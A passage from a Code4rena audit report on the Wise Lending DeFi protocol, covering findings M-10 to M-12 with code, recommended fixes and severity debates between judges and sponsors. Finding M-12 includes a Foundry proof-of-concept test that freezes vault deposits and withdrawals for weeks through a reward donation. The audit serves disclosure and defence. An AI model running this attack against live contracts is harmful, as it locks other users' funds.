Also, a really good safety check would be to ensure that after the liquidation is executed, the health of the position must be good in order to prevent this chain liquidation.

### Assessed type

Error

**[vonMangoldt (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/202#issuecomment-2007427556):**
 > This is not an issue since the liquidation incentive usually is lower than the difference in percentage between 100 and collateral factor. So paying back in my described scenario always makes the position more healthy. High as a description is overblown! Also, such a force could lead liquidators to be forced to loose money on a specific scenario before being able to access a profitable liquidation endangering the protocol.

**[Trust (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/202#issuecomment-2020860309):**
 > Cascading liquidations are a dangerous situation and I agree with the warden there are no built-in safety mechanisms around it in the liquidation routines (health is monotonically increasing or it is now healthy).
>
> However, the warden had to modify the collateral factors to demonstrate the issue in a PoC. It seems hard to determine whether by natural course of action, such a scenario would occur.
>
> According to the sponsor's remarks, the `liquidation incentive *usually* is lower than the difference in percentage between 100 and collateral factor.` This has not convinced me it could not occur by chance at some point. In case it does, it leads to higher than expected liquidation penalties. Weighing all the circumstances, I believe Medium to be appropriate.

**[Wise Lending commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/202#issuecomment-2082914485):**
> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).

***

## [[M-10] Lack of update when modifying pool fee](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/160)
*Submitted by [0xCiphky](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/160)*

The `FeeManager` contract allows the master address to modify the pool fee. This can be done to a single pool using the [`setPoolFee`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/FeeManager/FeeManager.sol#L108) function or multiple pools at once using the [`setPoolFeeBulk`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/FeeManager/FeeManager.sol#L135) function. This fee is used in the the [`syncPool`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseLending.sol#L97) modifier, specifically the [`_updatePseudoTotalAmounts`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/MainHelper.sol#L500) function which updates the interest amounts of the borrow and lending pools.

```solidity

    function setPoolFee(
        address _poolToken,
        uint256 _newFee
    )
        external
        onlyMaster
    {
        _checkValue(
            _newFee
        );

        WISE_LENDING.setPoolFee(
            _poolToken,
            _newFee
        );

        emit PoolFeeChanged(
            _poolToken,
            _newFee,
            block.timestamp
        );
    }
```

The issue is that the `setPoolFee` function modifies the pool fee without invoking the `syncPool` modifier beforehand. Consequently, the next sync operation incorrectly applies the updated pool fee to the period between the previous call and the change in the pool fee. Although the impact of changing the fee for a single pool may be minimal, using the `setPoolFeeBulk` function to alter fees for multiple pools could have a bigger impact.

### Impact

Depending on whether the pool fee is increased or decreased, the protocol or its users may end up paying additional fees or receiving reduced fees.

Likelihood: Low. This situation arises solely in instances where there is a change in the pool fee.

### Recommendation

Add the following code to update fees accurately before implementing changes:

```solidity
    function setPoolFee(
        address _poolToken,
        uint256 _newFee
    )
        external
        onlyMaster
    {
	WISE_LENDING.syncManually(_poolToken); //add here
		    
        _checkValue(
            _newFee
        );

        WISE_LENDING.setPoolFee(
            _poolToken,
            _newFee
        );

        emit PoolFeeChanged(
            _poolToken,
            _newFee,
            block.timestamp
        );
    }
```

### Assessed type

Context

**[vm06007 (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/160#issuecomment-2015328473):**
 > Admin can also call this manually (`syncManually`) directly on the contract after changing fee.

**[Trust (judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/160#issuecomment-2018994002):**
 > @vm06007 - This is true; but for it to reduce severity, we would need to see indication that likelihood of this happening (ergo, that the issue is known) is high.

**[Foon256 (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/160#issuecomment-2022828054):**
 > @Trust - But this is clearly a centralization issue and is OOS. Or what do I miss here?

**[Trust (judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/160#issuecomment-2022960398):**
 > Not every flaw in a privileged function can be viewed as a centralization issue. Warden demonstrated a plausible way where an HONEST admin interaction leads to incorrect fee allocation, which I consider to be in scope.

**[vm06007 (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/160#issuecomment-2032403508):**
 > @Trust - It seems "honest" is something caps-locked here so we better unfold this: 
> 
> - If admin decides not to call this, there is no issue.
> - If admin decides to call this and knows what to do then, there is no issue.
> - If admin decides to call this and does not know what to do only then it is an issue, so it falls under a category where it does not matter the intention of the admin (honest or dishonest can't really be a thing here). It is more of a question will admin make a mistake when calling that function without follow up, or admin does not make a mistake and makes correct calls on sync as well. 
> 
> Also it is in admins interest to make correct calls as expected. If admin makes a mistake then it is same topic of "admin error" no matter the intention.

**[Trust (judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/160#issuecomment-2032415752):**
 > Post-Judging QA is over, so unfortunately, we cannot consider any more arguments (in this submission or any other). I don't see how we can be confident admin knows to follow up this call correctly. If they are not aware of the issue in the report, that's the meaning of an honest mistake in my mind.

**[Wise Lending commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/160#issuecomment-2082916044):**
> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).

***

## [[M-11] `PendlePowerManager` is incompatible with `PendleRouterV3`](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/133)
*Submitted by [NentoR](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/133)*

<https://github.com/pendle-finance/pendle-core-v2-public/blob/main/contracts/router/ActionAddRemoveLiqV3.sol#L166-L172>

<https://github.com/pendle-finance/pendle-core-v2-public/blob/main/contracts/router/ActionAddRemoveLiqV3.sol#L444-L449>

<https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarm/PendlePowerFarmLeverageLogic.sol#L467-L482> 

<https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarm/PendlePowerFarmLeverageLogic.sol#L165-L171>

### Impact

Will cause revert when attempting to open a farm position.

### Proof of Concept

The latest deployment of the Pendle router, `PendleRouterV3`, is incompatible with the `PendlePowerManager` contract. The sponsor is expecting full compatibility with both but this is not the case here. The problem stems from the calls made to `PENDLE_ROUTER.removeLiquiditySingleSy()` and `PENDLE_ROUTER.addLiquiditySingleSy()`:

```solidity
function _logicOpenPosition(
    bool _isAave,
    uint256 _nftId,
    uint256 _depositAmount,
    uint256 _totalDebtBalancer,
    uint256 _allowedSpread
)
    internal
{
    // ...
    (
        uint256 netLpOut
        ,
    ) = PENDLE_ROUTER.addLiquiditySingleSy(
        {
            _receiver: address(this),
            _market: address(PENDLE_MARKET),
            _netSyIn: syReceived,
            _minLpOut: 0,
            _guessPtReceivedFromSy: ApproxParams(
                {
                    guessMin: netPtFromSwap - 100,
                    guessMax: netPtFromSwap + 100,
                    guessOffchain: 0,
                    maxIteration: 50,
                    eps: 1e15
                }
            )
        }
    );
  // ...
}

function _logicClosePosition(
    uint256 _nftId,
    uint256 _borrowShares,
    uint256 _lendingShares,
    uint256 _totalDebtBalancer,
    uint256 _allowedSpread,
    address _caller,
    bool _ethBack,
    bool _isAave
)
    private
{
    // ...
    (
        uint256 netSyOut
        ,
    ) = PENDLE_ROUTER.removeLiquiditySingleSy(
        {
            _receiver: address(this),
            _market: address(PENDLE_MARKET),
            _netLpToRemove: withdrawnLpsAmount,
            _minSyOut: 0
        }
    );
  // ...
}
```

The issue is that the signatures of those have changed in V3:

```solidity
function addLiquiditySingleSy(
    address receiver,
    address market,
    uint256 netSyIn,
    uint256 minLpOut,
    ApproxParams calldata guessPtReceivedFromSy,
    LimitOrderData calldata limit
) external returns (uint256 netLpOut, uint256 netSyFee);

function removeLiquiditySingleSy(
    address receiver,
    address market,
    uint256 netLpToRemove,
    uint256 minSyOut,
    LimitOrderData calldata limit
) external returns (uint256 netSyOut, uint256 netSyFee);
```

There's a new parameter called `limit` that's not accounted for in the calls in the `PendlePowerFarmLeverageLogic` helper contract. This will lead to calls always reverting with `RouterInvalidAction` due to Pendle's proxy not being able to locate the selector used.

Coded POC (`PendlePowerFarmControllerBase.t.sol`):

<details>

```solidity
function _setUpCustom(address _pendleRouter) private {
    _setProperties();

    pendleLockInstance = IPendleLock(AddressesMap[chainId].pendleLock);

    wethInstance = IWETH(AddressesMap[chainId].weth);

    wiseOracleHubInstance = WiseOracleHub(AddressesMap[chainId].oracleHub);

    aaveHubInstance = IAaveHub(AddressesMap[chainId].aaveHub);

    vm.startPrank(wiseLendingInstance.master());

    controllerTester = new PendleControllerTester(
        AddressesMap[chainId].vePendle,
        AddressesMap[chainId].pendleTokenAddress,
        AddressesMap[chainId].voterContract,
        AddressesMap[chainId].voterRewardsClaimer,
        AddressesMap[chainId].oracleHub
    );

    pendlePowerFarmTokenFactory = controllerTester.PENDLE_POWER_FARM_TOKEN_FACTORY();

    PoolManager.CreatePool memory params = PoolManager.CreatePool({
        allowBorrow: true,
        poolToken: AddressesMap[chainId].aweth,
        poolMulFactor: 17500000000000000,
        poolCollFactor: 805000000000000000,
        maxDepositAmount: 1800000000000000000000000
    });

    wiseLendingInstance.createPool(params);

    IAaveHub(AddressesMap[chainId].aaveHub).setAaveTokenAddress(
        AddressesMap[chainId].weth, AddressesMap[chainId].aweth
    );

    if (block.chainid == ETH_CHAIN_ID) {
        wiseOracleHubInstance.addOracle(
            AddressesMap[chainId].aweth,
            wiseOracleHubInstance.priceFeed(AddressesMap[chainId].weth),
            new address[](0)
        );

        wiseOracleHubInstance.recalibrate(AddressesMap[chainId].aweth);
    }

    _addPendleTokenOracle();

    _addPendleMarketOracle(
        AddressesMap[chainId].PendleMarketStEth,
        address(wiseOracleHubInstance.priceFeed(AddressesMap[chainId].weth)),
        AddressesMap[chainId].weth,
        2 ether,
        3 ether
    );

    IPendlePowerFarmToken derivativeToken =
        _addPendleMarket(AddressesMap[chainId].PendleMarketStEth, "name", "symbol", MAX_CARDINALITY);

    pendleChildLpOracleInstance = new PendleChildLpOracle(address(pendleLpOracleInstance), address(derivativeToken));

    address[] memory underlyingTokens = new address[](1);
    underlyingTokens[0] = AddressesMap[chainId].weth;

    wiseOracleHubInstance.addOracle(
        address(derivativeToken), IPriceFeed(address(pendleChildLpOracleInstance)), underlyingTokens
    );

    address[] memory underlyingTokensCurrent = new address[](0);

    wiseOracleHubInstance.addOracle(CRV_TOKEN_ADDRESS, IPriceFeed(CRV_ETH_FEED), underlyingTokensCurrent);

    wiseOracleHubInstance.recalibrate(CRV_TOKEN_ADDRESS);

    curveUsdEthOracleInstance = new CurveUsdEthOracle(IPriceFeed(ETH_USD_FEED), IPriceFeed(CRVUSD_USD_FEED));

    wiseOracleHubInstance.addOracle(
        CRVUSD_TOKEN_ADDRESS, IPriceFeed(address(curveUsdEthOracleInstance)), new address[](0)
    );

    wiseOracleHubInstance.recalibrate(CRVUSD_TOKEN_ADDRESS);

    wiseOracleHubInstance.addTwapOracle(
        CRV_TOKEN_ADDRESS,
        CRV_UNI_POOL_ADDRESS,
        CRV_UNI_POOL_TOKEN0_ADDRESS,
        CRV_UNI_POOL_TOKEN1_ADDRESS,
        UNI_V3_FEE_CRV_UNI_POOL
    );

    wiseOracleHubInstance.addTwapOracleDerivative(
        CRVUSD_TOKEN_ADDRESS,
        CRVUSD_UNI_POOL_TOKEN0_ADDRESS,
        [ETH_USDC_UNI_POOL_ADDRESS, CRVUSD_UNI_POOL_ADDRESS],
        [ETH_USDC_UNI_POOL_TOKEN0_ADDRESS, CRVUSD_UNI_POOL_TOKEN0_ADDRESS],
        [ETH_USDC_UNI_POOL_TOKEN1_ADDRESS, CRVUSD_UNI_POOL_TOKEN1_ADDRESS],
        [UNI_V3_FEE_ETH_USDC_UNI_POOL, UNI_V3_FEE_CRVUSD_UNI_POOL]
    );

    address underlyingFeed = CRVUSD_TOKEN_ADDRESS;

    _addPendleMarketOracle(
        CRVUSD_PENDLE_28MAR_2024, address(curveUsdEthOracleInstance), underlyingFeed, 0.0008 ether, 0.0016 ether
    );

    derivativeToken = _addPendleMarket(CRVUSD_PENDLE_28MAR_2024, "name", "symbol", MAX_CARDINALITY);

    pendleChildLpOracleInstance = new PendleChildLpOracle(address(pendleLpOracleInstance), address(derivativeToken));

    underlyingTokens = new address[](1);
    underlyingTokens[0] = underlyingFeed;

    wiseOracleHubInstance.addOracle(
        address(derivativeToken), IPriceFeed(address(pendleChildLpOracleInstance)), underlyingTokens
    );

    PoolManager.CreatePool[] memory createPoolArray = new PoolManager.CreatePool[](3);

    createPoolArray[0] = PoolManager.CreatePool({
        allowBorrow: true,
        poolToken: CRVUSD_TOKEN_ADDRESS,
        poolMulFactor: 17500000000000000,
        poolCollFactor: 740000000000000000,
        maxDepositAmount: 2000000000000000000000000
    });

    createPoolArray[1] = PoolManager.CreatePool({
        allowBorrow: false,
        poolToken: controllerTester.pendleChildAddress(AddressesMap[chainId].PendleMarketStEth),
        poolMulFactor: 17500000000000000,
        poolCollFactor: 740000000000000000,
        maxDepositAmount: 2000000000000000000000000
    });

    createPoolArray[2] = PoolManager.CreatePool({
        allowBorrow: false,
        poolToken: controllerTester.pendleChildAddress(CRVUSD_PENDLE_28MAR_2024),
        poolMulFactor: 17500000000000000,
        poolCollFactor: 740000000000000000,
        maxDepositAmount: 2000000000000000000000000
    });

    for (uint256 i = 0; i < createPoolArray.length; i++) {
        wiseLendingInstance.createPool(createPoolArray[i]);
    }

    powerFarmNftsInstance = new PowerFarmNFTs("", "");

    powerFarmManagerInstance = new PendlePowerManager(
        address(wiseLendingInstance),
        controllerTester.pendleChildAddress(AddressesMap[chainId].PendleMarketStEth),
        _pendleRouter,
        AddressesMap[chainId].entryAssetPendleMarketStEth,
        AddressesMap[chainId].PendleMarketStEthSy,
        AddressesMap[chainId].PendleMarketStEth,
        AddressesMap[chainId].pendleRouterStatic,
        AddressesMap[chainId].dex,
        950000000000000000,
        address(powerFarmNftsInstance)
    );

    wiseLendingInstance.setVerifiedIsolationPool(address(powerFarmManagerInstance), true);

    vm.stopPrank();

    if (block.chainid == ETH_CHAIN_ID) {
        address wethWhaleEthMain = 0x8EB8a3b98659Cce290402893d0123abb75E3ab28;

        vm.startPrank(wethWhaleEthMain);

        wethInstance.transfer(wiseLendingInstance.master(), 1000 ether);

        vm.stopPrank();
    }

    vm.startPrank(wiseLendingInstance.master());

    IERC20(AddressesMap[chainId].weth).approve(address(powerFarmManagerInstance), 1000000 ether);

    wiseSecurityInstance = IWiseSecurity(wiseLendingInstance.WISE_SECURITY());

    positionNftsInstance = IPositionNFTs(wiseLendingInstance.POSITION_NFT());
}

function testCompatibleWithRouter() public {
    address pendleRouter = 0x0000000001E4ef00d069e71d6bA041b0A16F7eA0;
    _decideChain(true);
    _setUpCustom(pendleRouter);
    _testFarmShouldEnterAndExitIntoToken();
}

function testFail_IncompatibleWithRouterV3() public {
    address pendleRouterV3 = 0x00000000005BBB0EF59571E58418F9a4357b68A0;
    _decideChain(true);
    _setUpCustom(pendleRouterV3);
    // Reverts with "RouterInvalidAction"
    _testFarmShouldEnterAndExitIntoToken();
}
```

</details>

### Recommended Mitigation Steps

Support only the latest router (V3) or add conditional checks to use the respective selector for each router version.

**[Trust (judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/133#issuecomment-2021111010):**
 > By definition a codebase can never be guaranteed to be compatible with the latest version. Requesting warden to provide evidence lack of integration with V3 achieves M+ severity.

**[NentoR (warden) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/133#issuecomment-2022631151):**
 > @Trust - The reason why I reported this was because the sponsor told me they expect compatibility with both. The problem is that an older version of pendle router is used here and the calls for `addLiquiditySingleSy()` and `removeLiquiditySingleSy()` are basically incompatible with the new one and will revert because of a missing parameter. To understand the rationale behind this submission, let's examine the deployed contracts:
> 
> [Current router version](https://arbiscan.io/address/0x0000000001E4ef00d069e71d6bA041b0A16F7eA0) (taken from test files).
>
> [PendleRouterV3 (latest)](https://arbiscan.io/address/0x00000000005BBB0EF59571E58418F9a4357b68A0).
> 
> Here's the code for both on Deth.net:
> [Old router](https://arbiscan.deth.net/address/0xFc0617465474a6b1CA0E37ec4E67B3EEFf93bc63) and [New one](https://arbiscan.deth.net/address/0x00000000005BBB0EF59571E58418F9a4357b68A0).
> 
> The functions can be found in`ActionAddRemoveLiq` and `ActionAddRemoveLiqV3`
> 
> Old one:
> ```solidity
>   /// @dev swaps SY to PT, then adds liquidity
>   function _addLiquiditySingleSy(
>       address receiver,
>       address market,
>       IPYieldToken YT,
>       uint256 netSyIn,
>       uint256 minLpOut,
>       ApproxParams calldata guessPtReceivedFromSy
>   ) internal returns (uint256 netLpOut, uint256 netSyFee) {
>       MarketState memory state = IPMarket(market).readState(address(this));
>       // ...
>   }
> ```
> 
> New one:
>
><details>
>
> ```solidity
> function addLiquiditySingleToken(
>     address receiver,
>     address market,
>     uint256 minLpOut,
>     ApproxParams calldata guessPtReceivedFromSy,
>     TokenInput calldata input,
>     LimitOrderData calldata limit
> ) external payable returns (uint256 netLpOut, uint256 netSyFee, uint256 netSyInterm) {
>     (IStandardizedYield SY, , IPYieldToken YT) = IPMarket(market).readTokens();
> 
>     netSyInterm = _mintSyFromToken(_entry_addLiquiditySingleSy(market, limit), address(SY), 1, input);
> 
>     (netLpOut, netSyFee) = _addLiquiditySingleSy(
>         receiver,
>         market,
>         SY,
>         YT,
>         netSyInterm,
>         minLpOut,
>         guessPtReceivedFromSy,
>         limit
>     );
>     
>     // ...
> }
> 
> function _addLiquiditySingleSy(
>     address receiver,
>     address market,
>     IStandardizedYield SY,
>     IPYieldToken YT,
>     uint256 netSyIn,
>     uint256 minLpOut,
>     ApproxParams calldata guessPtReceivedFromSy,
>     LimitOrderData calldata limit
> ) internal returns (uint256 netLpOut, uint256 netSyFee) {
>     uint256 netSyLeft = netSyIn;
>     uint256 netPtReceived;
> 
>     if (!_isEmptyLimit(limit)) {
>         (netSyLeft, netPtReceived, netSyFee, ) = _fillLimit(market, SY, netSyLeft, limit);
>         _transferOut(address(SY), market, netSyLeft);
>     }
> 
>     (uint256 netPtOutMarket, , ) = _readMarket(market).approxSwapSyToAddLiquidity(
>         YT.newIndex(),
>         netSyLeft,
>         netPtReceived,
>         block.timestamp,
>         guessPtReceivedFromSy
>     );
>     
>     // ...
> }
> ```
> 
> `_readMarket()` comes from `ActionBase`, here's it's definition:
> ```solidity
>  function _readMarket(address market) internal view returns (MarketState memory) {
>       return IPMarket(market).readState(address(this));
>   }
> ```
> You can see that both call `readState()` from the underlying Pendle market. Here you can find all market deployments: https://docs.pendle.finance/Developers/Deployments/Arbitrum#markets
> 
> I'll use the first one for the example.
> Arbiscan: https://arbiscan.io/address/0x7D49E5Adc0EAAD9C027857767638613253eF125f
> Deth.net: https://arbiscan.deth.net/address/0x7D49E5Adc0EAAD9C027857767638613253eF125f
> 
> If you look at the definion of `readState()`, you'll see the following:
> ```solidity
> function readState(address router) public view returns (MarketState memory market) {
>     market.totalPt = _storage.totalPt;
>     market.totalSy = _storage.totalSy;
>     market.totalLp = totalSupply().Int();
> 
>     (market.treasury, market.lnFeeRateRoot, market.reserveFeePercent) = IPMarketFactory(
>         factory
>     ).getMarketConfig(router);
> 
>     market.scalarRoot = scalarRoot;
>     market.expiry = expiry;
> 
>     market.lastLnImpliedRate = _storage.lastLnImpliedRate;
> }
> ```
>
></details>
>
> `readState()` on all markets reaches out to the factory contract it was deployed with to grab the market configuration. And there are two versions: `MarketFactory` and `MarketFactoryV3`. Again, both can be found in the docs but here are the links:
> 
> [MarketFactory](https://arbiscan.io/address/0xf5a7De2D276dbda3EEf1b62A9E718EFf4d29dDC8) and [MarketFactory V3]( https://arbiscan.io/address/0x2FCb47B58350cD377f94d3821e7373Df60bD9Ced).
> 
> You can take a market from the docs and query `Market::isValidMarket()`. Using the first one, the old factory will return true whereas the new one, false.
> 
> So basically what this all means is that the protocol won't be able to use new markets. Pendle can start phasing out the old ones and migrating them over. The fix is rather easy on the protocol's end, they just need to account for the newly added parameter and can support both, if they wish, using a conditional check.

**[Trust (judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/133#issuecomment-2022744919):**
 > @vonMangoldt - can you confirm the warden's claims around your intentions?

**[Trust (judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/133#issuecomment-2026828110):**
 > Without sponsor's take the warden's claim that V3 should be compatible with the design is accepted.

**[Wise Lending commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/133#issuecomment-2082918149):**
> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).

***

## [[M-12] `PendlePowerFarmToken:: totalLpAssetsToDistribute` may lead to temporary DOS due to price growth check being skipped during deposit](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/123)
*Submitted by [NentoR](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/123), also found by [NentoR](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/125) and [00xSEV](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/88)*

<https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L98-L130>

<https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L502-L524>

<https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L89-L95>

### Impact

Random actors, malicious or not, can DOS the Pendle `PowerFarm` vault by sending rewards to it through `PendlePowerFarmToken::addCompoundRewards()` or `PendlePowerFarmController::exchangeRewardsForCompoundingWithIncentive()`. This results in all users being unable to access their positions or open new ones for a set amount of time imposed by `PendlePowerFarmToken::_validateSharePriceGrowth()`.

### Proof of Concept

The `PendlePowerFarmToken` has a mechanism in place that protects the vault from people looping and increasing the share price:

```solidity
function _validateSharePriceGrowth(
    uint256 _sharePriceNow
)
    private
    view
{
    uint256 timeDifference = block.timestamp
        - INITIAL_TIME_STAMP;

    uint256 maximum = timeDifference
        * RESTRICTION_FACTOR
        + PRECISION_FACTOR_E18;

    if (_sharePriceNow > maximum) {
        revert InvalidSharePriceGrowth();
    }
}
```

This is a private function invoked from the `syncSupply()` modifier, which is used for the following functions:

- `manualSync()`
- `addCompoundRewards()`
- `depositExactAmount()`
- `withdrawExactShares()`
- `withdrawExactAmount()`

The entry point of this exploit is `addCompoundRewards()`:

```solidity
function addCompoundRewards(
    uint256 _amount
)
    external
    syncSupply
{
    if (_amount == 0) {
        revert ZeroAmount();
    }

    totalLpAssetsToDistribute += _amount;

    if (msg.sender == PENDLE_POWER_FARM_CONTROLLER) {
        return;
    }

    _safeTransferFrom(
        UNDERLYING_PENDLE_MARKET,
        msg.sender,
        PENDLE_POWER_FARM_CONTROLLER,
        _amount
    );
}
```

We can see that it allows users to donate their tokens to the vault to increase the `totalLpAssetsToDistribute`. This is then distributed among holders with subsequent calls to the aforementioned functions.

This is the code for the `syncSupply()` modifier:

```solidity
modifier syncSupply()
{
    _triggerIndexUpdate();
    _overWriteCheck();
    _syncSupply();
    _updateRewards();
    _setLastInteraction();
    _increaseCardinalityNext();
    uint256 sharePriceBefore = _getSharePrice();
    _;
    _validateSharePriceGrowth(
        _validateSharePrice(
            sharePriceBefore
        )
    );
}
```

The problem here is that even though `addCompoundRewards()` calls it, the rewards added do not affect the share price immediately. It's still the previously deposited amount. So, the condition `_sharePriceNow > maximum` holds true at the time someone calls `addCompoundRewards()` but causes a revert with subsequent calls to functions dependent on the modifier until enough time passes for the condition to hold true again.

Coded POC (`PendlePowerFarmControllerBase.t.sol`):

```solidity
 function testDOSVault() public normalSetup(true) {
    (IERC20 tokenReceived, uint256 balanceReceived) =
        _getTokensToPlayWith(CRVUSD_PENDLE_28MAR_2024, crvUsdMar2024LP_WHALE);

    (uint256 depositAmount, IPendlePowerFarmToken derivativeToken) =
        _prepareDeposit(CRVUSD_PENDLE_28MAR_2024, tokenReceived, balanceReceived);

    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address charlie = makeAddr("charlie");

    IERC20 pendleLpToken = IERC20(CRVUSD_PENDLE_28MAR_2024);

    pendleLpToken.transfer(alice, 1.3e18);
    pendleLpToken.transfer(bob, 2e18);
    pendleLpToken.transfer(charlie, 1e18);

    vm.startPrank(alice);
    pendleLpToken.approve(address(derivativeToken), 1.3e18);
    derivativeToken.depositExactAmount(1.3e18);
    vm.stopPrank();

    vm.startPrank(bob);
    pendleLpToken.approve(address(derivativeToken), 2e18);
    derivativeToken.addCompoundRewards(2e18);
    vm.stopPrank();

    // DOS happens once timestamp changes
    vm.warp(block.timestamp + 1 seconds);

    // Charlie cannot deposit
    vm.startPrank(charlie);
    pendleLpToken.approve(address(derivativeToken), 1e18);
    vm.expectRevert(); // InvalidSharePriceGrowth
    derivativeToken.depositExactAmount(1 ether);
    vm.stopPrank();

    // Alice cannot withdraw
    vm.startPrank(alice);
    vm.expectRevert(); // InvalidSharePriceGrowth
    derivativeToken.withdrawExactShares(1e18);
    vm.stopPrank();

    // After 8 weeks, transactions still fail since _sharePriceNow is still greater than maximum (look at PendlePowerFarmToken::__validateSharePriceGrowth())
    vm.warp(block.timestamp + 8 weeks);

    // Alice still cannot withdraw
    vm.startPrank(alice);
    vm.expectRevert(); // InvalidSharePriceGrowth
    derivativeToken.withdrawExactShares(1e18);
    vm.stopPrank();

    // From this point onwards, maximum > _sharePriceNow
    vm.warp(block.timestamp + 9 weeks);

    // Charlie can now deposit
    vm.startPrank(charlie);
    pendleLpToken.approve(address(derivativeToken), 1e18);
    derivativeToken.depositExactAmount(1 ether);
    vm.stopPrank();

    // Alice can now deposit
    vm.startPrank(alice);
    derivativeToken.withdrawExactShares(1e18);
    vm.stopPrank();
}
```

### Recommended Mitigation Steps

I recommend turning the deposited rewards into shares at the time of calling `addCompoundRewards()`, so we can get `_validateSharePriceGrowth()` to validate it immediately and revert on the spot if needed. This will prevent the DOS and share price growth manipulation.

### Assessed type

DoS

**[Trust (judge) increased severity to High and commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/123#issuecomment-2020999197):**
 > High is reasonable for temporary freeze of funds.


**[vm06007 (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/123#issuecomment-2022982231):**
 > > High is reasonable for temporary freeze of funds.
> 
> That is literally definition of a Medium - temporary freeze of the funds. High is permanent freeze of funds. So dismiss the high.

**[vm06007 (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/123#issuecomment-2022988055):**
 > https://docs.code4rena.com/awarding/judging-criteria/severity-categorization
> 
> 2 — Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.
> 
> 3 — High: Assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals.

**[Trust (judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/123#issuecomment-2023193084):**
 > This is on the upper end of temporary FoF attacks, it also lasts for an extended duration. I would rule High on much weaker versions of this finding, not even close to downgrade-worthy.

**[Alex the Entreprenerd (Appellate Court judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/123#issuecomment-2056798828):**
 > ### Summary of the issue
>
> Due to a security check on LP value growth, a donation can cause the temporary inability to withdraw from a Farm Contract
> 
> ### Discussion
> 
> **Alex the Entreprenerd (Appellate Court lead judge) commented:**
> Facts:
> The Dos has a cost, that grows with supply.
> The Dos can be performed permissionlessly, at any time.
> 
> I'm unclear as to whether this is tied to liquidation risk, which should raise the severity.
> 
> **hickuphh3 (judge 2) commented:**
> From what I see, it shouldn't affect liquidations or protocol health, only causing forced hodl with guaranteed returns. Hence, leaning towards Medium more than High.
> 
> **Alex the Entreprenerd (Appellate Court lead judge) commented:**
> Facts:
> Information contained in the report mentions exclusively an inability to withdraw (funds stuck).
> Other facts above still apply.
> 
> I agree that Medium Severity seems the most appropriate because:
> - More supply = higher cost.
> - Dos is temporary.
> - Unclear/Missing usage to DOS a key feature.
> 
> **LSDan (judge 3) commented:**
> I'm also of the opinion that Medium is more appropriate here. 
> 
>> 2 — Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.
>
> Assets are not at direct risk. The minute the DOS stops the assets are once again available. Further, the cost to DOS the platform is not trivial. As you both pointed out, the more assets being frozen, the higher the cost. The attacker is donating to the users they are DOSing, leaving the user inconvenienced, but richer at the attacker's expense.
> 
> ### Deliberation
>
> The severity is downgraded to Medium unanimously.
> 
> ### Additional Context by the Lead Judge
>
> Had the Report shown a way to weaponize this to halt liquidations, we would have had a easier time pushing for a higher severity.
> 
> However, given the Report only limiting itself to a temporary inability to withdraw, with no loss of principal, the decision was straightforward.

**[Trust (judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/123#issuecomment-2056897212):**
> 1. I remain convinced that a permissionless, non-theoretical temporary FoF for non-negligible length (certainly days/weeks as shown) meets High severity threshold.
> 2. Impact breaks a core invariant which states users can always pull out their funds. Users making monetary decisions under that assumption can certainly face loss of principal (e.g. cannot pull out to repay a due-loan, etc).

**[Wise Lending commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/123#issuecomment-2082919302):**
